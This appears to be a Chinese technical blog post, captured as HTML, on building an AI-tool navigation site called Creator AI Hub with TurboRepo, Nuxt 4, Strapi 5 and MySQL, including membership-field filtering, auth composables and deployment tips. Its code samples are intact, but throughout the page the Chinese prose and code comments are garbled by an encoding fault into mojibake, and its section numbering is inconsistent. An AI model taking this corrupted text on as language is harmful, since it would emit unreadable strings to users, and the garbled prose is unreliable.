<li><strong>å†…å®¹ä¸ºç‹</strong>ï¼šéœ€è¦é¢‘ç¹æ›´æ–° AI å·¥å…·ã€è§£å†³æ–¹æ¡ˆå’Œ SOPï¼Œä¸”å†…å®¹ç»“æ„å¤æ‚ï¼ˆåŒ…å«ä¼šå‘˜ä¸“å±å­—æ®µï¼‰ã€‚</li>
<li><strong>SEO å‹å¥½</strong>ï¼šä½œä¸ºå¯¼èˆªç«™ï¼Œæœç´¢å¼•æ“ä¼˜åŒ–è‡³å…³é‡è¦ï¼ŒæœåŠ¡ç«¯æ¸²æŸ“ (SSR) æ˜¯å¿…é€‰é¡¹ã€‚</li>
<li><strong>å¼€å‘æ•ˆç‡</strong>ï¼šå‰åç«¯éœ€ç´§å¯†é…åˆï¼Œä½†åˆè¦ä¿æŒç‹¬ç«‹éƒ¨ç½²å’Œç»´æŠ¤çš„çµæ´»æ€§ã€‚</li>
</ol>
<p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬é‡‡ç”¨äº† <strong>TurboRepo + Nuxt 4 + Strapi 5</strong> çš„é»„é‡‘ç»„åˆã€‚è¿™ä¸ä»…æ˜¯ä¸€æ¬¡æŠ€æœ¯é€‰å‹çš„èƒœåˆ©ï¼Œæ›´æ˜¯å¯¹ç°ä»£ Web å¼€å‘æœ€ä½³å®è·µçš„ä¸€æ¬¡å®Œæ•´æ¢ç´¢ã€‚</p>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad20acbea7614b6c9f7c984e9da30b37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6Iiq6am_56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767514051&amp;x-signature=8FpGGkkgiW3VjNoyKEtowMGBlVk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83382dedc6d7446c944cb101d4ff0b37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6Iiq6am_56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767514051&amp;x-signature=pZA%2BLGQE7KXTm87l3vgElg5wKXI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">1. ç³»ç»Ÿæ¶æ„æ¦‚è§ˆ (System Architecture)</h2>
<p>æœ¬é¡¹ç›®é‡‡ç”¨ <strong>Monorepo</strong> ç­–ç•¥ç®¡ç†å…¨æ ˆä»£ç ï¼ŒåŸºäº <strong>TurboRepo</strong> æ„å»ºé«˜æ•ˆçš„å·¥ä½œæµã€‚å‰ç«¯é‡‡ç”¨ <strong>Nuxt 4</strong> è¿›è¡ŒæœåŠ¡ç«¯æ¸²æŸ“ (SSR)ï¼Œåç«¯ä½¿ç”¨ <strong>Strapi v5</strong> ä½œä¸º Headless CMS æä¾› RESTful APIï¼Œæ•°æ®å­˜å‚¨åœ¨ <strong>MySQL</strong> ä¸­ã€‚</p>
<h3 data-id="heading-2">1.1 æŠ€æœ¯æ ˆ (Tech Stack)</h3>





















































<table><thead><tr><th align="left">é¢†åŸŸ</th><th align="left">æŠ€æœ¯é€‰å‹</th><th align="left">ç‰ˆæœ¬</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>Monorepo</strong></td><td align="left">TurboRepo</td><td align="left"><code>^2.7.2</code></td><td align="left">é«˜æ€§èƒ½æ„å»ºç³»ç»Ÿï¼Œç»Ÿä¸€ç®¡ç† apps</td></tr><tr><td align="left"><strong>Package Manager</strong></td><td align="left">pnpm</td><td align="left"><code>9.0.0</code></td><td align="left">é«˜æ•ˆçš„ç£ç›˜ç©ºé—´åˆ©ç”¨ä¸ä¾èµ–ç®¡ç†</td></tr><tr><td align="left"><strong>Frontend</strong></td><td align="left">Nuxt</td><td align="left"><code>^4.2.2</code></td><td align="left">åŸºäº Vue 3 çš„å…¨æ ˆæ¡†æ¶ï¼Œè´Ÿè´£ SSR ä¸äº¤äº’</td></tr><tr><td align="left"><strong>Styling</strong></td><td align="left">Tailwind CSS</td><td align="left"><code>^3.4</code></td><td align="left">åŸå­åŒ– CSS æ¡†æ¶ï¼Œé€šè¿‡ <code>@nuxtjs/tailwindcss</code> é›†æˆ</td></tr><tr><td align="left"><strong>Backend</strong></td><td align="left">Strapi</td><td align="left"><code>5.33.0</code></td><td align="left">çµæ´»çš„ Headless CMSï¼Œæä¾› API æœåŠ¡</td></tr><tr><td align="left"><strong>Database</strong></td><td align="left">MySQL</td><td align="left"><code>8.0</code></td><td align="left">å…³ç³»å‹æ•°æ®åº“ï¼Œé€šè¿‡ <code>mysql2</code> é©±åŠ¨è¿æ¥</td></tr><tr><td align="left"><strong>Docs</strong></td><td align="left">VitePress</td><td align="left">Latest</td><td align="left">é™æ€æ–‡æ¡£ç”Ÿæˆå™¨</td></tr></tbody></table>
<h3 data-id="heading-3">1.2 ç›®å½•ç»“æ„ (Directory Structure)</h3>
<pre><code class="hljs language-bash" lang="bash">.
â”œâ”€â”€ apps/
â”‚   â”œâ”€â”€ api/          <span class="hljs-comment"># Strapi åç«¯åº”ç”¨ (Port: 1337)</span>
â”‚   â”‚   â”œâ”€â”€ src/api/  <span class="hljs-comment"># ä¸šåŠ¡é€»è¾‘ (Content Types, Controllers, Services)</span>
â”‚   â”‚   â””â”€â”€ config/   <span class="hljs-comment"># æ•°æ®åº“ä¸æ’ä»¶é…ç½®</span>
â”‚   â”œâ”€â”€ web/          <span class="hljs-comment"># Nuxt å‰ç«¯åº”ç”¨ (Port: 3000)</span>
â”‚   â”‚   â”œâ”€â”€ components/ <span class="hljs-comment"># Vue ç»„ä»¶</span>
â”‚   â”‚   â”œâ”€â”€ composables/<span class="hljs-comment"># ç»„åˆå¼å‡½æ•° (Data Fetching, State)</span>
â”‚   â”‚   â””â”€â”€ pages/      <span class="hljs-comment"># è·¯ç”±é¡µé¢</span>
â”‚   â””â”€â”€ docs/         <span class="hljs-comment"># é¡¹ç›®æ–‡æ¡£ (VitePress)</span>
â”œâ”€â”€ package.json      <span class="hljs-comment"># Workspace æ ¹é…ç½®</span>
â”œâ”€â”€ turbo.json        <span class="hljs-comment"># Turbo æ„å»ºç®¡çº¿é…ç½®</span>
â””â”€â”€ pnpm-workspace.yaml
</code></pre>
<h3 data-id="heading-4">2.3 ä¼šå‘˜æƒé™è®¾è®¡ (Membership System)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09e8a9583a6e42dab846929ac0ee9c87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6Iiq6am_56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767514051&amp;x-signature=UfI77CYFkvAYswzzPpQNZ9wmP9Q%3D" alt="image.png" loading="lazy"/>
ä¸ºäº†åŒºåˆ†æ™®é€šç”¨æˆ·ä¸ä»˜è´¹ä¼šå‘˜ï¼Œæˆ‘ä»¬åœ¨ Strapi åç«¯æ‰©å±•äº† <code>Membership</code> å’Œ <code>Order</code> æ¨¡å‹ã€‚</p>
<h4 data-id="heading-5">æ ¸å¿ƒé€»è¾‘</h4>
<ol>
<li><strong>ç”¨æˆ·æ³¨å†Œ</strong>: é»˜è®¤åˆ†é…ä¸º <code>Authenticated</code> è§’è‰²ï¼Œæ— ä¼šå‘˜æƒç›Šã€‚</li>
<li><strong>è®¢é˜…æ”¯ä»˜</strong>: ç”¨æˆ·è´­ä¹°ä¼šå‘˜ï¼ˆæœˆ/å¹´/ç»ˆèº«ï¼‰åï¼Œåç«¯æ›´æ–° <code>Membership</code> è¡¨ï¼Œè®°å½•è¿‡æœŸæ—¶é—´ã€‚</li>
<li><strong>æƒé™æ ¡éªŒ</strong>: åœ¨è·å– Tool è¯¦æƒ…æ—¶ï¼ŒController ä¼šæ ¡éªŒå½“å‰ç”¨æˆ·çš„ Membership çŠ¶æ€ã€‚å¦‚æœè¿‡æœŸæˆ–æœªè®¢é˜…ï¼Œåˆ™<strong>å‰”é™¤</strong> <code>tool.member</code> å­—æ®µï¼ˆåŒ…å« SOP å’Œæ•æ„Ÿæ•°æ®ï¼‰ã€‚</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// apps/api/src/api/tool/controllers/tool.ts (ä¼ªä»£ç ç¤ºä¾‹)</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">findOne</span>(<span class="hljs-params">ctx</span>) {
  <span class="hljs-keyword">const</span> { id } = ctx.<span class="hljs-property">params</span>;
  <span class="hljs-keyword">const</span> user = ctx.<span class="hljs-property">state</span>.<span class="hljs-property">user</span>;
  
  <span class="hljs-comment">// 1. è·å–å·¥å…·å®Œæ•´æ•°æ®</span>
  <span class="hljs-keyword">const</span> entity = <span class="hljs-keyword">await</span> strapi.<span class="hljs-title function_">service</span>(<span class="hljs-string">'api::tool.tool'</span>).<span class="hljs-title function_">findOne</span>(id, { <span class="hljs-attr">populate</span>: [<span class="hljs-string">'member'</span>] });
  
  <span class="hljs-comment">// 2. æ£€æŸ¥ç”¨æˆ·ä¼šå‘˜çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> isMember = <span class="hljs-keyword">await</span> strapi.<span class="hljs-title function_">service</span>(<span class="hljs-string">'api::membership.membership'</span>).<span class="hljs-title function_">checkStatus</span>(user?.<span class="hljs-property">id</span>);
  
  <span class="hljs-comment">// 3. æ•°æ®æ¸…æ´—ï¼šéä¼šå‘˜ç§»é™¤ member å­—æ®µ</span>
  <span class="hljs-keyword">if</span> (!isMember &amp;&amp; entity.<span class="hljs-property">member</span>) {
    <span class="hljs-keyword">delete</span> entity.<span class="hljs-property">member</span>;
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transformResponse</span>(entity);
}
</code></pre>
<hr/>
<h2 data-id="heading-6">3. åç«¯è®¾è®¡ (Backend Design) - Strapi v5</h2>
<p>åç«¯æ ¸å¿ƒèŒè´£æ˜¯æä¾›ç»“æ„åŒ–çš„å†…å®¹ç®¡ç†ä¸ API æœåŠ¡ã€‚</p>
<h3 data-id="heading-7">2.1 æ•°æ®æ¨¡å‹ (Content Modeling)</h3>
<p>æˆ‘ä»¬å®šä¹‰äº†å¤šç»´åº¦çš„å†…å®¹ç±»å‹ (Content Types) æ¥æ”¯æ’‘ä¸šåŠ¡ï¼š</p>
<ul>
<li><strong>Collection Types</strong>:
<ul>
<li><code>Tool</code>: AI å·¥å…·æ ¸å¿ƒæ•°æ®ï¼ˆåç§°ã€æè¿°ã€URLã€Logoï¼‰ã€‚</li>
<li><code>Category</code>: å·¥å…·åˆ†ç±»ã€‚</li>
<li><code>Solution</code>: è§£å†³æ–¹æ¡ˆæ–‡ç« ã€‚</li>
</ul>
</li>
<li><strong>Single Types</strong>:
<ul>
<li><code>Global</code>: å…¨å±€é…ç½®ï¼ˆç«™ç‚¹æ ‡é¢˜ã€SEO ä¿¡æ¯ã€ç¤¾ç¾¤äºŒç»´ç ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>Components</strong>:
<ul>
<li><code>tool.member</code>: ä»˜è´¹ä¼šå‘˜ä¸“å±å­—æ®µï¼ˆSOPã€é¿å‘æŒ‡å—ï¼‰ï¼Œåˆ©ç”¨ Strapi ç»„ä»¶åŠŸèƒ½å®ç°çµæ´»çš„æ•°æ®ç»“æ„ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">Schema ç¤ºä¾‹ (<code>Global</code> Config)</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// apps/api/src/api/global/content-types/global/schema.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"kind"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"singleType"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"collectionName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"globals"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"info"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"singularName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"global"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"pluralName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"globals"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"displayName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Global"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"attributes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"communityGroupTitle"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"default"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"åŠ å…¥å®˜æ–¹äº¤æµç¾¤"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"communityGroupQrCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"media"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"multiple"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"allowedTypes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"images"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-9">2.2 API æ‰©å±•ä¸æƒé™</h3>
<ul>
<li><strong>æƒé™æ§åˆ¶</strong>: ä½¿ç”¨ <code>@strapi/plugin-users-permissions</code> ç®¡ç† Public ä¸ Authenticated è§’è‰²æƒé™ã€‚</li>
<li><strong>è‡ªå®šä¹‰é€»è¾‘</strong>: é€šè¿‡è¦†å†™ Core Controllers æˆ–å¢åŠ  Middleware å®ç°æ›´ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ï¼ˆå¦‚ï¼šéä¼šå‘˜è¯·æ±‚ Tool è¯¦æƒ…æ—¶è¿‡æ»¤æ‰ <code>tool.member</code> å­—æ®µï¼‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-10">3. å‰ç«¯è®¾è®¡ (Frontend Design) - Nuxt 4</h2>
<p>å‰ç«¯åº”ç”¨ä¸“æ³¨äºé«˜æ€§èƒ½æ¸²æŸ“ä¸æè‡´çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h3 data-id="heading-11">3.1 æ ¸å¿ƒç‰¹æ€§å®ç°</h3>
<ul>
<li><strong>æœåŠ¡ç«¯æ¸²æŸ“ (SSR)</strong>: æå‡ SEO è¡¨ç°ï¼Œé¦–å±åŠ è½½é€Ÿåº¦å¿«ã€‚</li>
<li><strong>ç»„åˆå¼å¼€å‘</strong>: åˆ©ç”¨ Nuxt Composables å°è£…ä¸šåŠ¡é€»è¾‘ã€‚</li>
</ul>
<h3 data-id="heading-12">3.2 å…³é”®ä»£ç è§£æ</h3>
<h4 data-id="heading-13">ğŸ” èº«ä»½è®¤è¯ä¸çŠ¶æ€ç®¡ç† (<code>useAuth.ts</code>)</h4>
<p>ä¸ºäº†ä¿è¯ç”¨æˆ·ä½“éªŒï¼Œæˆ‘ä»¬å°è£…äº†ç»Ÿä¸€çš„è®¤è¯é€»è¾‘ï¼Œæ”¯æŒæ³¨å†Œã€ç™»å½•åŠ JWT Token æŒä¹…åŒ–ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// apps/web/composables/useAuth.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useAuth</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> user = useState&lt;<span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-string">'user'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> token = <span class="hljs-title function_">useCookie</span>(<span class="hljs-string">'auth_token'</span>)
  <span class="hljs-keyword">const</span> { $strapi } = <span class="hljs-title function_">useNuxtApp</span>()

  <span class="hljs-comment">// ç™»å½•é€»è¾‘</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">credentials: LoginInput</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> { <span class="hljs-attr">user</span>: userData, jwt } = <span class="hljs-keyword">await</span> $strapi.<span class="hljs-title function_">login</span>(credentials)
      token.<span class="hljs-property">value</span> = jwt
      user.<span class="hljs-property">value</span> = userData
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
  }
  
  <span class="hljs-comment">// æ³¨å†Œé€»è¾‘ (è‡ªåŠ¨å…³è”é»˜è®¤è§’è‰²)</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">register</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">input: RegisterInput</span>) =&gt; {
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">user</span>: newUser, jwt } = <span class="hljs-keyword">await</span> $strapi.<span class="hljs-title function_">register</span>(input)
    token.<span class="hljs-property">value</span> = jwt
    user.<span class="hljs-property">value</span> = newUser
  }

  <span class="hljs-keyword">return</span> { user, login, register }
}
</code></pre>
<h4 data-id="heading-14">å…¨å±€é…ç½®è·å– (<code>useGlobal.ts</code>)</h4>
<p>ä¸ºäº†å®ç°é…ç½®åŠ¨æ€åŒ–ï¼Œæˆ‘ä»¬å°è£…äº† <code>useGlobalConfig</code>ï¼Œå®ƒåœ¨åº”ç”¨åˆå§‹åŒ–æ—¶ä» Strapi è·å–é…ç½®ï¼Œå¹¶é€‚é… Strapi v5 çš„å“åº”ç»“æ„ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// apps/web/composables/useGlobal.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useGlobalConfig</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useState</span>(<span class="hljs-string">'global-config'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">null</span>)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchGlobalConfig</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> config = <span class="hljs-title function_">useGlobalConfig</span>()
  <span class="hljs-keyword">const</span> { find } = <span class="hljs-title function_">useStrapi</span>() <span class="hljs-comment">// å°è£…çš„ Strapi Fetcher</span>
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// é€‚é… Strapi v5 API å“åº”ç»“æ„ (dataunwrap)</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">find</span>(<span class="hljs-string">'global'</span>, {
      <span class="hljs-attr">populate</span>: <span class="hljs-string">'*'</span> <span class="hljs-comment">// è¿è¡¨æŸ¥è¯¢æ‰€æœ‰å…³è”å­—æ®µ (å¦‚å›¾ç‰‡)</span>
    })
    config.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span> || {}
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to fetch global config:'</span>, error)
  }
}
</code></pre>
<h4 data-id="heading-15">åŠ¨æ€ç»„ä»¶æ¸²æŸ“ (<code>profile.vue</code>)</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d23aa9c95b984035ab6bdbb8a1deaebc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-l6Iiq6am_56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767514051&amp;x-signature=g7HhXumZKVGOwGSb2KsCURUpxtY%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ä¸ªäººä¸­å¿ƒé¡µï¼Œæˆ‘ä»¬ç›´æ¥ç»‘å®šä»åç«¯è·å–çš„é…ç½®æ•°æ®ï¼Œå®ç°è¿è¥å†…å®¹çš„å®æ—¶æ›´æ–°ã€‚</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- apps/web/pages/profile.vue --&gt;
&lt;script setup lang="ts"&gt;
const globalConfig = useGlobalConfig()

// å¤„ç†å›¾ç‰‡ URL çš„è¾…åŠ©å‡½æ•°
const getQrCodeUrl = (qrCodeObj: any) =&gt; {
  // å…¼å®¹ Strapi ä¸Šä¼ æ’ä»¶çš„ URL æ ¼å¼
  return qrCodeObj?.url ? `${useStrapiUrl()}${qrCodeObj.url}` : '/default-qr.png'
}
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="community-card"&gt;
    &lt;h3&gt;{{ globalConfig?.communityGroupTitle }}&lt;/h3&gt;
    &lt;img 
      :src="getQrCodeUrl(globalConfig?.communityGroupQrCode)" 
      alt="Community QR" 
    /&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<hr/>
<h2 data-id="heading-16">5. éƒ¨ç½²ä¸è¿ç»´ (Deployment &amp; DevOps)</h2>
<h3 data-id="heading-17">4.1 ç¯å¢ƒå˜é‡ç®¡ç†</h3>
<p>é¡¹ç›®ä½¿ç”¨ <code>.env</code> æ–‡ä»¶ç®¡ç†æ•æ„Ÿä¿¡æ¯ï¼ŒåŒºåˆ†å¼€å‘ä¸ç”Ÿäº§ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># .env (Root)</span>
<span class="hljs-attr">STRAPI_URL</span>=http://localhost:<span class="hljs-number">1337</span>
<span class="hljs-attr">NUXT_PUBLIC_API_URL</span>=http://localhost:<span class="hljs-number">1337</span>/api
<span class="hljs-attr">DATABASE_HOST</span>=localhost
<span class="hljs-attr">DATABASE_PORT</span>=<span class="hljs-number">3306</span>
</code></pre>
<h3 data-id="heading-18">4.2 æ„å»ºæµç¨‹</h3>
<p>åˆ©ç”¨ TurboRepo çš„ç¼“å­˜æœºåˆ¶åŠ é€Ÿæ„å»ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¹¶è¡Œæ„å»ºæ‰€æœ‰åº”ç”¨</span>
pnpm build

<span class="hljs-comment"># Turbo æ™ºèƒ½ç¼“å­˜ç¤ºä¾‹</span>
<span class="hljs-comment"># apps/web: cache miss, executing 345ms</span>
<span class="hljs-comment"># apps/api: cache hit, replaying output 50ms</span>
</code></pre>
<h3 data-id="heading-19">4.3 ç”Ÿäº§ç¯å¢ƒå»ºè®®</h3>
<ul>
<li><strong>Process Manager</strong>: ä½¿ç”¨ PM2 ç®¡ç† Node.js è¿›ç¨‹ã€‚</li>
<li><strong>Reverse Proxy</strong>: Nginx åå‘ä»£ç†ï¼Œé…ç½® SSL è¯ä¹¦ä¸ Gzip å‹ç¼©ã€‚</li>
<li><strong>Storage</strong>: Strapi ä¸Šä¼ æ–‡ä»¶å»ºè®®å¯¹æ¥ AWS S3 æˆ–é˜¿é‡Œäº‘ OSS å¯¹è±¡å­˜å‚¨ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-20">6. å¼€å‘æ•ˆèƒ½ä¸ AI èµ‹èƒ½ (AI-Driven Development)</h2>
<p><strong>Creator AI Hub</strong> çš„è¯ç”Ÿæœ¬èº«å°±æ˜¯ AI èµ‹èƒ½å¼€å‘çš„æœ€ä½³å®è·µã€‚</p>
<blockquote>
<p><strong>â±ï¸ æƒŠäººçš„é€Ÿåº¦ï¼šä» 0 åˆ° 1ï¼Œä»…ç”¨ 48 å°æ—¶</strong></p>
</blockquote>
<p>å¦‚æœä¸å€ŸåŠ© AI å·¥å…·ï¼Œè¿™æ ·ä¸€ä¸ªåŒ…å«å…¨æ ˆæ¶æ„ã€CMS åå°ã€ä¼šå‘˜ç³»ç»Ÿå’Œ SSR å‰ç«¯çš„é¡¹ç›®ï¼Œé€šå¸¸éœ€è¦ 2-3 å‘¨çš„å¼€å‘å‘¨æœŸã€‚ä½†åœ¨ AI è¾…åŠ©ä¸‹ï¼Œæˆ‘ä»¬å®ç°äº† <strong>10 å€ææ•ˆ</strong>ã€‚</p>
<h3 data-id="heading-21">6.1 AI è¾…åŠ©å…¨æµç¨‹</h3>
<ol>
<li><strong>æ¶æ„è®¾è®¡</strong>: AI ååŠ©é€‰å‹ TurboRepo + Nuxt 4ï¼Œå¹¶ç”Ÿæˆäº†åˆå§‹çš„ Monorepo ç›®å½•ç»“æ„ã€‚</li>
<li><strong>Schema ç”Ÿæˆ</strong>: Strapi çš„å¤æ‚ Content Typesï¼ˆå¦‚åµŒå¥—ç»„ä»¶ã€å…³è”å…³ç³»ï¼‰JSON é…ç½®ï¼Œç”± AI ä¸€é”®ç”Ÿæˆï¼ŒèŠ‚çœäº†å¤§é‡æ‰‹åŠ¨é…ç½®æ—¶é—´ã€‚</li>
<li><strong>ä»£ç ç¼–å†™</strong>:
<ul>
<li>å‰ç«¯ <code>useAuth</code>ã€<code>useGlobal</code> ç­‰æ ¸å¿ƒ Composable é€»è¾‘ç”± AI å¿«é€Ÿå®ç°ã€‚</li>
<li>Tailwind CSS çš„å“åº”å¼å¸ƒå±€å’Œå¾®äº¤äº’æ•ˆæœï¼Œé€šè¿‡ AI æç¤ºè¯å¿«é€Ÿè°ƒæ•´ã€‚</li>
</ul>
</li>
<li><strong>æ–‡æ¡ˆä¸æ–‡æ¡£</strong>: é¡¹ç›®æ–‡æ¡£ï¼ˆåŒ…æ‹¬æœ¬æ–‡ï¼‰ã€SEO æè¿°ã€åˆå§‹æµ‹è¯•æ•°æ®ï¼Œå‡ç”± AI è¾…åŠ©æ’°å†™ã€‚</li>
</ol>
<h2 data-id="heading-22">7. æ¶æ„æ‰©å±•æ€§ï¼šä»å¯¼èˆªç«™åˆ°æ— é™å¯èƒ½ (Scalability)</h2>
<p>Creator AI Hub çš„è¿™å¥— <strong>"Monorepo + Headless CMS + SSR Frontend"</strong> æ¶æ„ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé€šç”¨çš„<strong>å†…å®¹å˜ç°ä¸çŸ¥è¯†ä»˜è´¹åŸºåº§</strong>ã€‚å®ƒä¸ä»…é™äºå¯¼èˆªç«™ï¼Œåªéœ€å¾®è°ƒæ•°æ®æ¨¡å‹ï¼Œå³å¯å¿«é€Ÿè£‚å˜å‡ºå¤šç§åº”ç”¨ï¼š</p>
<h3 data-id="heading-23">7.1 ğŸ’¡ å˜ä½“ä¸€ï¼šä»˜è´¹è¯¾ç¨‹å¹³å°</h3>
<ul>
<li><strong>æ”¹åŠ¨ç‚¹</strong>: å°† <code>Tool</code> æ¨¡å‹æ”¹ä¸º <code>Course</code>ï¼ˆè¯¾ç¨‹ï¼‰ï¼Œ<code>tool.member</code> æ”¹ä¸º <code>CourseChapter</code>ï¼ˆè¯¾ç¨‹ç« èŠ‚ï¼‰ã€‚</li>
<li><strong>åŠŸèƒ½å¤ç”¨</strong>: ä¼šå‘˜è®¢é˜…ç³»ç»Ÿã€è®¢å•æ”¯ä»˜ã€CMS ç« èŠ‚ç®¡ç†ã€å‰ç«¯è§†é¢‘æ’­æ”¾é¡µã€‚</li>
</ul>
<h3 data-id="heading-24">7.2 ğŸ›’ å˜ä½“äºŒï¼šè™šæ‹Ÿèµ„æºå•†åŸ</h3>
<ul>
<li><strong>æ”¹åŠ¨ç‚¹</strong>: å°† <code>Category</code> ç»†åŒ–ä¸ºèµ„æºç±»å‹ï¼ˆPPTæ¨¡æ¿/è®¾è®¡ç´ æ/Promptï¼‰ï¼Œå¢åŠ  <code>DownloadLink</code> å­—æ®µã€‚</li>
<li><strong>åŠŸèƒ½å¤ç”¨</strong>: æœç´¢è¿‡æ»¤ã€èµ„æºè¯¦æƒ…é¡µã€ä¸‹è½½æƒé™æ§åˆ¶ï¼ˆä»…ä¼šå‘˜æˆ–å•æ¬¡è´­ä¹°å¯ä¸‹è½½ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-25">7.3 ğŸ¢ å˜ä½“ä¸‰ï¼šä¼ä¸šå†…éƒ¨çŸ¥è¯†åº“</h3>
<ul>
<li><strong>æ”¹åŠ¨ç‚¹</strong>: å¼€å¯ Strapi çš„ SSO å•ç‚¹ç™»å½•ï¼Œå…³é—­å…¬å¼€æ³¨å†Œã€‚</li>
<li><strong>åŠŸèƒ½å¤ç”¨</strong>: æ–‡æ¡£å±‚çº§ç®¡ç†ã€SOP æ ‡å‡†åŒ–æµç¨‹å±•ç¤ºã€å…¨ç«™å…¨æ–‡æ£€ç´¢ã€‚</li>
</ul>
